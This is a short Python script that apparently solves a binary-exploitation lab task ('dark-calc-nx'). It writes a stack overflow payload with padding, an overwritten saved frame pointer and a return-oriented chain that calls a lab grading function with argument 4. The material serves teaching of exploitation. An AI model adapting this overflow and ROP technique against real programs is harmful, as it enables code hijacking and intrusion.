#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload  = b"A" * 16                                    # [0..15]  expression[16]
payload += b"A" * 8                                     # [16..23] saved rbp
payload += bytes.fromhex("33 1a 40 00 00 00 00 00")     # [24..31] pop rdi; ret
payload += bytes.fromhex("04 00 00 00 00 00 00 00")     # [32..39] rdi = 4
payload += bytes.fromhex("34 1a 40 00 00 00 00 00")     # [40..47] ret（栈对齐）
payload += bytes.fromhex("78 19 40 00 00 00 00 00")     # [48..55] grade_eval
payload += bytes.fromhex("b8 19 40 00 00 00 00 00")     # [56..63] main+4

sys.stdout.buffer.write(payload)
